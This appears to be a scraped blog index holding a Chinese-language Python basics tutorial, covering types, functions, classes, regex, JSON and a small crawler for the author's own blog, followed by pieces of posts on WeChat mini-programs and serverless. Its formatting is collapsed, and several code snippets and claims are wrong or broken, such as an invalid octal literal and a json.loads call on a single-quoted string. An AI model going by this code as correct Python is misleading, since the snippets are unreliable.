模式多样：语法层面同时支持面向过程和面向对象两种编程方式- 粘性扩展：通过接口和函数集成其他语言编写的代码- 开源理念- 库类丰富**Python语言开发环境配置**- `Python`解释器- `IDLE`开发环境- 交互式启动- 文件式启动- `Python`语言集成开发环境——`PyCharm`## 二、基本知识### 注释- 注释是辅助性文字，不被执行- 单行注释：以`#`开头\n\n#这是注释\n&gt; 多行注释：以`&#x27;&#x27;&#x27;`(3个单引号)开头和结尾\n‘’’这是注释这也是注释这还是注释‘’’\n### 命名- 命名是为变量关联标识符的过程，用于确保程序元素的唯一性- 标识符由字母、数字、下划线（和汉字）等字符及其组合构成- 标识符的首字符不能是数字 ，且中间不能出现空格- 标识符对大小写敏感### 保留字- 保留字（`Keyword`）也被称为关键字，是被编程语言内部定义并保留使用的标识符- `Python` 的标准库提供了一个 `keyword` 模块，可以输出当前版本的所有关键字：\n\n\n\nimport keywordls&#x3D;keyword.kwlistlslen(ls)33\n\n\n\n**Python 3 有33个保留字**- `True`- `False`- `None`- `and`- `as`- `assert`- `break`- `class`- `continue`- `def`- `del`- `elif`- `else`- `except`- `finally`- `for`- `from`- `global`- `if`- `import`- `in`- `is`- `lambda`- `nonlocal`- `not`- `or`- `pass`- `raise`- `return`- `try`- `while`- `with`- `yield`### input()函数- 使用`input()`函数从控制台获得用户输入- `input()`函数以字符串类型返回结果### eval()函数- `eval(&lt;字符串&gt;)`函数的作用是间输入的字符串变成Python语句并执行\nx&#x3D;eval(input(“请输入：”))\n### print()函数- `print()`函数可以输出字符信息，也可以用字符的形式输出变量- 输出字符信息时，可以直接将待输出内容传递给`print()`函数- 输出变量值时，`print()`函数用槽格式和过`format()`方法将变量和字符串结合到一起输出### 函数- 函数可以理解为对一组表达特定功能表达式的封装，将特定功能代码编写在一个函数里，使程序模块化更好，便于阅读和复用- 可通过保留字`def`自定义函数### 文件操作![img](https://poetries1.gitee.io/img-repo/2019/12/107.png)\n使用with操作文件with open(os.path.dirname(file) + ‘&#x2F;blog.text’,’w’) as f:    f.write(json.dumps(data))\n![路径操作模块](https://poetries1.gitee.io/img-repo/2019/12/131.png)![图片](https://poetries1.gitee.io/img-repo/2019/12/132.png)![Excel](https://poetries1.gitee.io/img-repo/2019/12/133.png)![文本其他](https://poetries1.gitee.io/img-repo/2019/12/134.png)## 三、基本类型![python基本数据类型](https://poetries1.gitee.io/img-repo/2019/12/112.png)**类型判断两个方式**- `type` 判断基本类型 如 `type(10) == int` 不推荐- `isinstance(值,类型)` 或者 `isinstance(值,(int,float,str))` 三种中任意一种  - 例 `isinstance(1,int)`- `Number`  - `int`  - `float`  - ```    complex\n\n复数\n\n- 如`36j`\n\n\n&#96;&#96;&#96;Bool  - `bool(&#x27;&#x27;)/bool([])/bool(&#123;&#125;)/bool(0)/bool(None)`  - 都是转化为`False`- 字符串\nstr     （序列）  - 单引号  - 双引号  - 三引号(可以换行写多个字符串和ES6的反引号类似)  - 在字符串前面加一个`r`，这个字符串就不是一个普通字符串，而是一个原始字符串会原样输出 `print(r&#x27;\\n88fafa&#x27;)` 此时`\\n`不会转译- `list` 列表 （序列）- `tuple` 元组 （序列）- 集合\nset(无序，没有索引，不能切片，元素唯一，不能重复,只有\nvalue，没\nkey) \n{} 如 \n{1,2,3,4}  - `1 in &#123;1,2,3&#125;`  - `1 not in &#123;1,2,3,4&#125;`  - 两个集合插集`&#123;1,2,3&#125; - &#123;4,5&#125;`  - 两个集合求交集 `&#123;1,2,3,4&#125; &amp; &#123;2,3&#125;`  - 并集 `&#123;1,2,3,4,5,6&#125; | &#123;3,4,7&#125;`  - 定义一个空的集合 `set()`- 字典\ndict（有\nkey无\nvalue，不同于集合只有\nvalue  ）  - 很多`key-value`组成,不能够有相同的键，  - `key`键不可变类型，可以是`int/str/tuple`  - `value`可以是：`int/str/float/list/set/dict`  - 定义一个空的字典 `&#123;&#125;`&gt; 两个整型相除得到整型 type(1//2) ==&gt;int 整除会保留整数\n&#x2F;&#x2F; 二进制0b10012\n\n&#x2F;&#x2F; 八进制0o101\n&#x2F;&#x2F; 16进制0x10\n&#x2F;&#x2F; 10进制转二进制bin(10)\n&#x2F;&#x2F; 八进制转二进制bin(o09012)\n&#x2F;&#x2F; 八进制、二进制转十进制int(0b1000)\n&#x2F;&#x2F; 十进制转16进制hex(88891)\n&#x2F;&#x2F; 八进制转化oct(0b100)\n**转译字符**\n\\n 换行\\t 横向制表符\n**内置的字符串处理函数**| 函数       | 描述                                                  || :--------- | :---------------------------------------------------- || `len(&#x27;x&#x27;)` | 返回字符串`x`的长度，也可返回其他组合数据类型元素个数 || `str(&#x27;x&#x27;)` | 返回任意类型`x`所对应的字符串形式                     || `chr(x)`   | 返回`Unicode`编码`x`对应的单字符                      || `ord(&#x27;x&#x27;)` | 返回单字符表示的`Unicode`编码                         || `hex(x)`   | 返回整数`x`对应十六进制数的小写形式字符串             || `oct(x)`   | 返回整数`x`对应八进制数的小写形式字符串               |**内置的字符串处理方法（共43个，常用16个）**- 在`Python`解释器内部，所有数据类型都采用面向对象的方式实现，封装为一个类- 字符串是一个类，具有类似`.()`形式的字符串处理函数，称为方法| 方法                                   | 描述                                                         || :------------------------------------- | :----------------------------------------------------------- || `str.lower()`                          | 返回字符串`str`的副本，全部字符小写                          || `str.upper()`                          | 返回字符串`str`的副本，全部字符大写                          || `str.islower()`                        | 当str所有字符都是小写时，返回`Ture`，否则返回`False`         || `str.isprintable()`                    | 当str所有字符都是可打印的，返回`Ture`，否则返回`False`       || `str.isnumeric()`                      | 当str所有字符都是数字时，返回`Ture`，否则返回`False`         || `str.isspace()`                        | 当str所有字符都是空格，返回`Ture`，否则返回`Flase`           || `str.endswith(suffix[,start[,end]])`   | `str[start:end]`以`suffix`结尾返回`Ture`，否则返回`Flase`    || `str.srartswith(prefix[,start[,end]])` | `str[start:end]`以`prefix`开始返回`Ture`，否则返回`Flase`    || `str.split(sep=None,maxsplit=-1)`      | 返回一个列表，由`str`根据`sep`被分割的部分构成               || `str.count(sub[,start[,end]]`          | 返回`str[start:end]`中`sub`子串出现的次数                    || `str.replace(old,new[,count])`         | 返回字符串`str`的副本，所有`old`子串被替换为`new`，如果`count`给出，则前`count`次`old`出现被替换 || `str.center(width[,fillchar])`         | 字符串居中函数                                               || `str.strip([chars])`                   | 返回字符串`str`的副本，在其左侧和右侧去掉`chars`中列出的字符 || `str.zfill(width)`                     | 返回字符串`str`副本，长度为`width`。不足部分在其左侧添加`0`  || `str.format()`                         | 返回字符串`str`的一种排版格式                                || `str.join(iterable)`                   | 返回一个新字符串，由组合数据类型`iterable`变量的每个元素组成，元素间用`str`分隔 |## 四、序列-元组、字符串、列表**序列共性**- 切片- 序号- `in`判断符 `2 in [1,2,3]` `2 not in [1,2,3]`- `len()`- `max(list)`- `min(list)`![序列](https://poetries1.gitee.io/img-repo/2019/12/109.png)![序列基本操作](https://poetries1.gitee.io/img-repo/2019/12/108.png)**可变类型**- `list` 需要动态改变，就用列表- `dict`- `set`**不可变类型**- `str`- `tuple` 定义之后不可变，安全性较高- `int`**字符串基本操作**\n&#x2F;&#x2F; +号运算str1 &#x3D; ‘hell’str2 &#x3D; ‘world’str &#x3D; str1 + str2\n&#x2F;&#x2F; 乘法运算str1*3 &#x2F;&#x2F; 重复3次\n&#x2F;&#x2F; 切片str1[1:2]&#x2F;&#x2F; 赋值操作year,month,day &#x3D; (2019,10,12)\n&gt; 如果只有一个元素，应该这样表示元组 `(1,)`,一个元素都没有的元组 `type( () )`![python类型转换](https://poetries1.gitee.io/img-repo/2019/12/126.png)## 五、运算符![python运算符](https://poetries1.gitee.io/img-repo/2019/12/113.png)**列表元组都可以比较**\n(1,2,3) &gt; (1,1,1) &#x2F;&#x2F; 两两比较第一个、第二个…数字\n**字典的成员运算符**\n&#x2F;&#x2F; 只针对key‘a’ in {‘a’: ‘1’} &#x2F;&#x2F; True\n**身份运算符**- `is` 两个取值相等才会返回True `&#x27;1&#x27; is &#x27;1&#x27; // True`- `is not` 不等\n&#x2F;&#x2F; 关系运算符比较的是两个值是否相等 如1 &#x3D;&#x3D; 1.0 &#x2F;&#x2F; True\n&#x2F;&#x2F; is比较的是两个变量内存地址是否相等 id(值) 获取内存地址1 is 1.0 &#x2F;&#x2F; False\n**对象的三个特征**- `id`(身份) =&gt; `is`判断- `value` =&gt; `==` 判断- `type` =&gt; `isinstance` 判断**位运算符**&gt; 把数字当二进制进行运算。把非二进制转化为二进制才计算- `&amp;` 按位与- `|` 按位或- `^` 按位异或- `~`按位取反- `&lt;&lt;` 左移动- `&gt;&gt;` 右移动## 六、循环、条件、枚举- `if else`- `while`- `for in`**range**\n&#x2F;&#x2F; 等同于for(var i&#x3D;0;i&lt;len;i++){}\n&#x2F;&#x2F; rangefor i in range(0,10)\n&#x2F;&#x2F; 2是步长for i in range(0,10,2)\n&#x2F;&#x2F; 取出1，3，5，7a &#x3D; [1,2,3,4,5,6,7,8]for i in range(0,len(a),2)\n&#x2F;&#x2F;切片写法a[0:len(a):2]\n## 七、枚举\n‘’’枚举‘’’ \nfrom enum import Enum\nclass VIP(Enum):\n值可以相同 但是py会把第二个设置别名  yellow &#x3D; 1  green &#x3D; 2  red &#x3D; 3  black &#x3D; 4\n枚举不能被修改VIP.red &#x3D; 10print(VIP.yellow)\n获取枚举值print(VIP.yellow.value)\n获取枚举标签print(VIP.yellow.name)\n根据名称获取枚举类print(VIP[‘red’]) # VIP.red\n枚举遍历 获取每个成员for i in VIP:  print(i)\nfor v in VIP.members.items():  print(v)\n‘’’(‘yellow’, &lt;VIP.yellow: 1&gt;)(‘green’, &lt;VIP.green: 2&gt;)(‘red’, &lt;VIP.red: 3&gt;)(‘black’, &lt;VIP.black: 4&gt;)‘’’\n成员之间进行比较 不持续大小比较res &#x3D; VIP.red &#x3D;&#x3D; VIP.blackprint(res) # False\n身份比较print(VIP.red is VIP.red)\n枚举类型转换print(VIP(1)) # VIP.yellow\n## 八、闭包、模块、函数、变量作用域### 模块![模块](https://poetries1.gitee.io/img-repo/2019/12/110.png)\n&#x2F;&#x2F; 在文件中写__init__.py 只是标注这是一个包 可以什么都不用写\n**导入模块重新命名**\nimport test as t\n**函数**&gt; 函数内部没有`return` 返回的结果就是`None`\n&#x2F;&#x2F; 函数可以返回多个值def test():  return x, y,z\n&#x2F;&#x2F; 接收返回的值x,y,z &#x3D; test()  &#x2F;&#x2F; 其实就是返回了一个元组类型\n### 闭包\n‘’’闭包 &#x3D; 函数+环境变量（在函数外部）‘’’\ndef test():  num &#x3D; 10  def fun(x):    return num * x  return fun\nf &#x3D; test()print(f(10))\norigin &#x3D; 0def go(step):  global origin  new_pos &#x3D; step + origin  origin &#x3D; new_pos  return new_pos\nprint(go(1))print(go(2))print(go(3))\n### 匿名函数 lambda\n‘’’函数式编程：匿名函数 lambda‘’’\ndef add(x,y):  return x + y \nadd(1,2)\n匿名函数定义f &#x3D; lambda x,y: x+y\nprint(f(1,2))\narr &#x3D; [{‘key’: ‘poetries’,’value’: 100},{‘key’: ‘jing’,’value’: 10}]\n处理键值对res &#x3D; map(lambda item: {‘name’: item[‘key’],’score’: item[‘value’]}, arr)\nprint(list(res))\n### map函数\n‘’’map函数‘’’\narr &#x3D; [1,2,3,4,5,6]arr2 &#x3D; [10,12,14,16,12,14]\n列表推导式a &#x3D; [i*i for i in arr ]\nprint(a)map函数b &#x3D; map(lambda x: x*x,arr)print(list(b))\nc &#x3D; map(lambda x,y: x*x + y,arr,arr2) # 可以传多个list，个数要相同print(list(c))\n### reduce函数\n‘’’reduce函数‘’’\nfrom functools import reduce\narr &#x3D; [1,2,3,4,5,6]\n连续调用lambdar &#x3D; reduce(lambda x,y:x+y,arr)\nprint(r)\n### filter函数\n‘’’filter函数‘’’\narr &#x3D; [1,2,3,4,5,6,7,0,0,False,’’]\n过滤空字符串res &#x3D; filter(lambda x: not not x,arr)\nprint(list(res)) # [1,2,3,4,5,6,7]\n## 九、装饰器\n‘’’装饰器:特性、注解‘’’\nimport time \ndef decorator1(func):  def wrapper(name):    print(time.time())    func(name)  return wrapper\n@decorator1def f1(name):  print(‘this is a func’,name)\nf1(‘poetries’)def decorator2(func):  def wrapper(*args,**kw):    print(time.time())    print(args,’args’)    print(kw,’kw’)    func(*args,**kw)  return wrapper\n@decorator2def f2(p1,p2):  print(‘this is a func’,p1,p2)\nf2(‘静观流叶’,’1’)\n## 十、面向对象![类](https://poetries1.gitee.io/img-repo/2019/12/115.png)\n‘’’面向对象类&#x3D;面向对象\n行为、特征\n类最基本的作用封装代码‘’’\nauthor &#x3D; ‘poetries’\nclass Student(Human):\n类变量 静态属性  author &#x3D; ‘poetry’  SUM &#x3D; 10  num &#x3D; 999  score &#x3D; 98  text &#x3D; ‘小明今年’\n  def init(self,name,age):    # 构造函数 初始化对象属性    # 成员可见性 __外部不能访问    self.__name &#x3D; name    self.__age &#x3D; age \n实例方法 第一个参数默认是self  def getAge(self):    # 实例中可调用类变量    # print(self.author)    return self.__getText() + str(self.__age)  def getName(self):    return self.__name  def setName(self,name):    self.__name &#x3D; name\n私有方法，外部不可以访问  def __getText(self):    return self.text\n静态方法没有self实例和类都可以调用  @staticmethod  def test():    # 内部可以访问类变量    print(‘静态方法’,Student.SUM)\n类方法 操作和类相关的cls代表student这个类使用方式 student.testd()实例和类都可以调用，不要使用实例调用推荐使用类方法代替静态方法  @classmethod  def testd(cls):    print(‘classMethod’)\nstu &#x3D; Student(‘poetries’,22)\nprint(stu.getAge())\n修改内部变量值，通过内部定义一个方法，可以在内部进行判断，起到保护作用stu.setName(‘静观流叶’)\nprint(stu.getName())\nprint(Student.author)print(Student.dict)print(Student.test())‘’’继承‘’’\nclass Human(object):  num &#x3D;10  def init(self,name,age):    self.__name &#x3D; name    self.__age &#x3D; age \n  def getName(self):    return self.__name\n继承父类Humanclass Student(Human):  def init(self,school,name,age):    self.school &#x3D; school    # 子类调用父类构造函数    # 方式1    # Human.init(self,name,age)    # 方式2 推荐super    super(Student,self).init(name,age)\n  def getInfo(self):    return self.getName() + self.school\nstu &#x3D; Student(‘中山大学’,’poetry’,22)print(stu.getInfo())\n## 十一、正则表达式&gt; 是一个特殊的字符序列，一个字符串是否与我们所设定的这样的字符序列相匹配库re\n&#x2F;&#x2F;替换非数字的 s &#x3D; re.sub(‘\\D’,’’,’9fafjla9dfaldfah-dfal+++)@#–9912’)\n&#x2F;&#x2F; 例子 传递函数 根据匹配结果替换操作def convert(value):  match &#x3D; value.group()  return ‘!!’ + match\nre.sub(‘#c’, convert, ‘pythonc#fda’)&#x2F;&#x2F; findall 可以加上第三个参数模式re.I忽略大小写&#x2F;&#x2F; re.S 改变.的匹配行为，可以匹配换行符/n&#x2F;&#x2F; 返回 [‘99999’]re.findall(‘\\d+’,’kfdafd99999fa’,re.I | re.S)\n&#x2F;&#x2F; 匹配仅仅是对前面那个字符起作用&#x2F;&#x2F; n匹配0次或者1次re.findall(‘python?’, ‘pythonnn’)\n- `re.match` 没有找到匹配的，将会返回`None`- `re.search` 直到搜索到- `re.sub` 替换- `re.findall` 推荐 返回一个列表## 十二、内建函数https://docs.python.org/3/library/functions.html![内建函数](https://poetries1.gitee.io/img-repo/2019/12/114.png)## 十三、标准库常用模块- 文字处理 re- 日期类型 time、datetime- 随机数、数学类型 math、random- 文件和目录访问 pathlib os.path- 数据压缩 tarfile- 通用操作系统 os、logging、argparse- 多线程 threading、queue- 网络数据处理 base64 json urllib- 结构化标记处理工具 html xml- 调试工具 timeit- 软件包发布 venv- 运行服务的 **main**## 十四、异常处理![python异常类型](https://poetries1.gitee.io/img-repo/2019/12/127.png)&gt; `try-except`语句\ntry:    &lt;语句块1&gt;except &lt;异常类型&gt;:    &lt;语句块2&gt;\n&gt; try-except语句可以支持多个except语句\ntry:    &lt;语句块1&gt;except &lt;异常类型1&gt;：    &lt;语句块2&gt;…except &lt;异常类型N&gt;:    &lt;语句块N+1&gt;except &lt;异常类型N+!&gt;:    &lt;语句块N+2&gt;\n## 十五、JSON操作- `json`库主要包括两类函数，操作类函数和解析类函数- 操作类函数主要完成外部`JSON`格式和程序内部数据类型之间的转换功能  解析类函数主要用于解析键值对内容- `json`格式包括对象和数组- 对象用大括号(`&#123;&#125;`)表示，对应键值对的组合关系（被`json`库解析为字典）- 数组用中括号(`&#123;&#125;`)表示，对应键值对的对等关系（被`json`库解析为列表）**json库解析**- `json`库包含编码（`encoding`）和解码（`decoding`）两个过程  编码将`Python`数据类型变换成JSON格式- 解码是从`JSON`格式中解析数据对应到`Python`数据类型的过程  `json`库的操作类函数| 函数                                             | 描述                                               || :----------------------------------------------- | :------------------------------------------------- || `json.dumps(obj,sort_keys=Flase,indent=None)`    | 将Python的数据类型转换为`JSON`格式，编码过程       || `json.loads(string)`                             | 将`JSON`格式字符串转换为Python的数据类型，解码过程 || `json.dump(obj,fp，sort_keys=Flase,indent=None)` | 与`dumps()`功能一致，输出到文件`fp`                || `json.load(fp)`                                  | 与`loads()`功能一致，从文件`fp`读入                |- `json.dumps()`中的`obj`可以是`Python`的列表或字典类型，当输入字典类型时，`dumps()`函数将其变为`JSON`格式字符串- 默认生成的字符串是顺序存放的，`sort_keys`可以对字典元素按照`key`进行排序控制输出结果- `indent`参数用于增加数据缩进，使得生成的`JSON`格式字符串更具可读性\nimport json\n&#x2F;&#x2F; 反序列化str &#x3D; “{‘name’: ‘poetries’}”json.loads(str)\n&#x2F;&#x2F; 序列化json.dumps([{name: ‘poetries’])\n&gt; json数据类型和python对比| JSON     | python  || :------- | :------ || `object` | `dict`  || `array`  | `list`  || `string` | `str`   || `number` | `int`   || `number` | `float` || `true`   | `True`  || `false`  | `False` || `null`   | `None`  |## 十六、爬虫![模块](https://poetries1.gitee.io/img-repo/2019/12/111.png)\n‘’’原生爬虫: 分页爬取我的博客文章列表‘’’\nfrom urllib import requestimport re,json,os\nbaseUrl &#x3D; ‘http://blog.poetries.top&#39;class Spider():  url &#x3D; baseUrl + ‘&#x2F;archives&#x2F;‘  pattern &#x3D; ‘([\\w]*?)‘\n  def init(self,page&#x3D;1):    self.page &#x3D; page \n  def __fetch_content(self):    url &#x3D; Spider.url    if self.page !&#x3D; 1:      url &#x3D; Spider.url + ‘page&#x2F;‘ + str(self.page)\nr = request.urlopen(url)\n#bytes\nhtmls = str(r.read(), encoding=&#39;utf-8&#39;)\nreturn htmls\n\n  def _analyse(self, htmls):    res &#x3D; re.findall(Spider.pattern, htmls)\nreturn res\n\n  def start(self):    htmls &#x3D; self.__fetch_content()    return self._analyse(htmls)\n分页获取所有文章标题result &#x3D; [] # 保存多页数据 [[],[],[]]for page in range(1,15):  print(‘开始趴取，第(%d&#x2F;%d)页文章…….’%(page,14))  spider &#x3D; Spider(page)  res &#x3D; spider.start()  result.append(res)  if page &#x3D;&#x3D; 14:    print(‘所有页面已趴取完…’)\ndata &#x3D; [] # 处理后的数据if len(result) !&#x3D; 0:  for i in result:    res &#x3D; list(map(lambda item: {        ‘url’: baseUrl + item[0],        ‘title’: item[1]      },i))    # 合并两个数组 [] + []    data +&#x3D; res\n保存到当前文件夹  with open(os.path.dirname(file) + ‘&#x2F;blog.text’,’w’) as f:    f.write(json.dumps(data))\nprint(data)\n## 十七、常用库### datetime库&gt; `datetime`库可以从系统中获得时间，并以用户选择的格式输出&gt; - `datetime`库以格林威治时间为基础，每天由`3600*24`秒精准定义&gt; - `datetime`库以类的方式提供多种日期和时间- `datetime.date`：日期表示类，坑人表示年、月、日等。- `datetime.time`：时间表示类，可表示小时、分钟、秒、毫秒等。- `datetime.datetime`：日期和时间表示类，功能覆盖date和time类。- `datetime.timedelta`：与时间间隔有关的类。- `datetime.tzinfo`：与时区有关的信息表示类。**datetime库解析**1. `datetime.now()`：返回一个`datetime`类型，表示当前日期和时间，精确到毫秒\n\n\n\nfrom datetime import datetimenow&#x3D;datetime.now()nowdatetime.datetime(2018, 5, 13, 16, 49, 38, 627464)\n\n\n\n1. `datetime.utcnow()`：返回一个`datetime`类型，表示当前日期和时间的`UTC`（世界标准时间）表示，精确到毫秒\n\n\n\nfrom datetime import datetimeutcnow&#x3D;datetime.now()utcnowdatetime.datetime(2018, 5, 13, 8, 53, 59, 788612)\n\n\n\n1. 直接使用`datetime()`构造一个日期和时间对象：&gt; datetime(Y,M,D,hour=0,minute=0,second=0,microsecond=0)\n\n\n\nsome&#x3D;datetime(2018,5,13,17,0,0,0)somedatetime.datetime(2018, 5, 13, 17, 0)\n\n\n\n**datetime类的常用属性**| 属性               | 描述                                                         || :----------------- | :----------------------------------------------------------- || `some.min`         | 固定返回`datetime`的最小时间对象，`datetime(1,1,1,0,0)`      || `some.max`         | 固定返回datetime的最大时间对象，`datetime(9999,12,31,23,59,59,999999)` || `some.year`        | 返回`some`包含的年份                                         || `some.month`       | 返回`some`包含的月份                                         || `some.day`         | 返回`some`包含的日期                                         || `some.hour`        | 返回`some`包含的小时                                         || `some.minute`      | 返回`some`包含的分钟                                         || `some.second`      | 返回`some`包含的秒钟                                         || `some.microsecond` | 返回`some`包含的毫秒                                         |**datetime类的常用时间格式化方法**|属性| 描述||`some.isofomat()` |采用`ISO8601`标准显示时间||`some.isoweekday()` |根据日期计算星期||`some.strftime()` |根据格式化字符串`format`进行格式显示的方法|**strftime()方法用于输出特定格式时间**| 格式化字符串 | 对象            | 取值范围           || :----------- | :-------------- | :----------------- || `%Y`         | 年              | `0001~9999`        || `%m`         | 月              | `1~12`             || `%B`         | 月名            | `January~December` || `%b`         | 月名缩写        | `Jan~Dec`          || `%d`         | 日期            | `01~31`            || `%A`         | 星期            | `Monday~Sunday`    || `%a`         | 星期缩写        | `Mon~Sum`          || `%H`         | 小时（`24h`制） | `00~23`            || `%I`         | 小时（`12h`制） | `01~12`            || `%p`         | 上、下午        | `AM/PM`            || `%M`         | 分钟            | `00~59`            || `%S`         | 秒              | `00~59`            |\n\n\n\nsome&#x3D;datetime(2018,5,13,17,0,0,0)some.strftime(“%Y年%m月%d日，%H时%M分%S秒”)‘2018年05月13日，17时00分00秒’\n\n\n\n\n\n\nprint(‘今天是{0:%Y}年{0:%m}月{0:%d}日’.format(some))今天是2018年05月13日\n\n\n\n### random库&gt; random库采用梅森旋转算法生成伪随机数序列，可用于除随机性要求更高的加解密算法外的大多数工程应用- `Python`内置的`random`库主要用于产生各种分布的伪随机数序列- `random`库提供`9`个常用函数| 函数                           | 描述                                             || :----------------------------- | :----------------------------------------------- || `seed(a=None)`                 | 初始化随机数种子，默认值为当前系统时间           || `random()`                     | 生成一个`[0.0,1.0]`之间的随机小数                || `randint(a,b)`                 | 生成一个`[a,b]`之间的整数                        || `getrandbits(k)`               | 生成一个`k`比特长度的随机整数                    || `randrange(start,stop[,step])` | 生成一个[start,stop]之间以`step`为步数的随机整数 || `uniform(a,b)`                 | 生成一个`[a,b]`之间的随机小数                    || `choice(seq)`                  | 从序列类型，例如列表中随机返回一个元素           || `shuffle(seq)`                 | 将序列类型中的元素随机排列，返回打乱后的序列     || `sample(pok,k)`                | 从`pop`类型中随机选取`k`个元素，以列表类型返回   |&gt; 生成随机数之前可通过`seed()`函数指定随机数种子，随机数种子一般是一个整数，只要种子相同，每次生成的随机数序列也相同## 十八、技巧**查看命令信息**\n&#x2F;&#x2F; 例如help(filter)\n**列表中取出符合条件的元素**\n&#x2F;&#x2F; 取出大于5的元素\narr &#x3D; [1,2,3,4,5,6,7,8]\narr1 &#x3D; filter(lambda x: x&gt;5, arr)\n&#x2F;&#x2F; 转化为列表list(arr1)\n**列表推导式**&gt; 代替for和if嵌套循环。最常用的方式\n&#x2F;&#x2F; for循环列子list &#x3D; []\nfor x in range(10): if x % 2 &#x3D;&#x3D; 0:    list.append(xx)&#x2F;&#x2F; 等价于上面写法[xx for x in range(10) if x%2 &#x3D;&#x3D; 0]\n**字典推导式**\n&#x2F;&#x2F; 一般写法d &#x3D; {}for i in ‘xxx’:  d[i] &#x3D; i\n&#x2F;&#x2F; 字典推导写法{i:i for i in ‘xxx’}\n**文件读取**\nf &#x3D; open(‘test.txt’,encoding&#x3D;’utf-8’)data &#x3D; f.readlines()for line in data:print(line.strip(‘\\n’))f.close()推荐用with处理with open(‘test.txt’) as f:  for line in f.readlines():    print(line.strip(‘\\n’))\n**函数作用域**\ndef test():    global a &#x2F;&#x2F; 定义一个全局变量\n**装饰器**&gt; 本质是返回一个闭包\ndef log(func):    def wrapper():        print(‘start’)        func()        print(‘end’)    return wrapper\n@logdef test():    print(‘测试’)\n**交换两个变量**\n\n\n\nx &#x3D; 10y &#x3D; 20x,y &#x3D; y,x\n\n\n\n&#96;&#96;&#96;\n十九、Python知识体系\n二十、更多参考\n廖雪峰python3教程\nJupyter Notebook\n\n","categories":["后端"],"tags":["python"]},{"title":"小程序发布流程","url":"/2018/10/17/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%91%E5%B8%83%E6%B5%81%E7%A8%8B/","content":"一、背景在中大型的公司里，人员的分工非常仔细，一般会有不同岗位角色的员工同时参与同一个小程序项目。为此，小程序平台设计了不同的权限管理使得项目管理者可以更加高效管理整个团队的协同工作\n\n以往我们在开发完网页之后，需要把网页的代码和资源放在服务器上，让用户通过互联网来访问\n在小程序的平台里，开发者完成开发之后，需要在开发者工具提交小程序的代码包，然后在小程序后台发布小程序\n\n二、流程关于发布的流程，主要分成了三个部分：\n\n上传代码\n提交审核\n发布版本\n\n上传代码在开发者工具中，可以点击代码上传功能：\n\n然后就可以填写版本信息：\n\n然后点击上传，编译器则会提示上传代码成功\n提交审核代码上传完毕，就可以登陆微信公众号的官网首页，点击【开发管理】，查看应用详情：\n\n提交审核过程需要填写审核信息，如下图：\n\n提交审核成功之后如下图：\n\n发布版本当审核通过之后，即可提交发布\n\n发布成功之后则如下：\n\n三、扩展上述是最简单的小程序代码发布的流程，通常的流程如下：\n\n代码管理服务器上新建分支\n开发测试新需求\n测试完成后，将本地分支合并到 master 分支\n拉取 master 分支最新代码，执行 build 命令生成小程序可执行文件\n开发者工具点击“上传”\n提审\n发布\n\n但是面对多人协调开发的时候，有可能出现已经上线的代码还没合并到master的情况\n因此可以考虑自动化构建部署，就是将从开发到部署的一系列流程变成自动化，衔接连贯，在构建失败时能够告知开发者，构建成功后能够告知测试和实施人员，可参考如下流程图：\n\n","categories":["小程序"],"tags":["小程序"]},{"title":"小程序实现原理","url":"/2020/02/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","content":"一、背景网页开发，渲染线程和脚本是互斥的，这也是为什么长时间的脚本运行可能会导致页面失去响应的原因，本质就是我们常说的 JS 是单线程的\n而在小程序中，选择了 Hybrid 的渲染方式，将视图层和逻辑层是分开的，双线程同时运行，视图层的界面使用 WebView 进行渲染，逻辑层运行在 JSCore 中\n\n\n渲染层：界面渲染相关的任务全都在 WebView 线程里执行。一个小程序存在多个界面，所以渲染层存在多个 WebView 线程\n逻辑层：采用 JsCore 线程运行 JS 脚本，在这个环境下执行的都是有关小程序业务逻辑的代码\n\n二、通信小程序在渲染层，宿主环境会把wxml转化成对应的JS对象\n在逻辑层发生数据变更的时候，通过宿主环境提供的setData方法把数据从逻辑层传递到渲染层，再经过对比前后差异，把差异应用在原来的Dom树上，渲染出正确的视图\n\n当视图存在交互的时候，例如用户点击你界面上某个按钮，这类反馈应该通知给开发者的逻辑层，需要将对应的处理状态呈现给用户\n对于事件的分发处理，微信进行了特殊的处理，将所有的事件拦截后，丢到逻辑层交给JavaScript进行处理\n\n由于小程序是基于双线程的，也就是任何在视图层和逻辑层之间的数据传递都是线程间的通信，会有一定的延时，因此在小程序中，页面更新成了异步操作\n异步会使得各部分的运行时序变得复杂一些，比如在渲染首屏的时候，逻辑层与渲染层会同时开始初始化工作，但是渲染层需要有逻辑层的数据才能把界面渲染出来\n如果渲染层初始化工作较快完成，就要等逻辑层的指令才能进行下一步工作\n因此逻辑层与渲染层需要有一定的机制保证时序正确，在每个小程序页面的生命周期中，存在着若干次页面数据通信\n\n三、运行机制小程序启动运行两种情况：\n\n冷启动（重新开始）：用户首次打开或者小程序被微信主动销毁后再次打开的情况，此时小程序需要重新加载启动，即为冷启动\n热启动：用户已经打开过小程序，然后在一定时间内再次打开该小程序，此时无需重新启动，只需要将后台态的小程序切换到前台，这个过程就是热启动\n\n需要注意：\n1.小程序没有重启的概念2.当小程序进入后台，客户端会维持一段时间的运行状态，超过一定时间后会被微信主动销毁3.短时间内收到系统两次以上内存警告，也会对小程序进行销毁，这也就为什么一旦页面内存溢出，页面会奔溃的本质原因了\n\n\n开发者在后台发布新版本之后，无法立刻影响到所有现网用户，但最差情况下，也在发布之后 24 小时之内下发新版本信息到用户\n每次冷启动时，都会检查是否有更新版本，如果发现有新版本，将会异步下载新版本的代码包，并同时用客户端本地的包进行启动，即新版本的小程序需要等下一次冷启动才会应用上\n","categories":["小程序"],"tags":["小程序"]},{"title":"serverless学习总结","url":"/2021/02/11/%E4%BA%91%E6%9C%8D%E5%8A%A1/serverless%E5%AD%A6%E4%B9%A0/","content":"一、什么是Serverless\nServerless 能解决什么问题？理清 Serverless 要解决的问题其实很简单，我们可以从字面上把它拆开来看。Server 这里指服务端，它是 Serverless 解决问题的边界；而 less 我们可以理解为较少关心，它是 Serverless 解决问题的目的。组合在一起就是“较少关心服务端”\n\n\n第一种：狭义 Serverless（最常见）&#x3D; Serverless computing 架构 &#x3D; FaaS 架构 &#x3D; Trigger（事件驱动）+ FaaS（函数即服务）+ BaaS（后端即服务，持久化或第三方服务）&#x3D; FaaS + BaaS\n第二种：广义 Serverless &#x3D; 服务端免运维 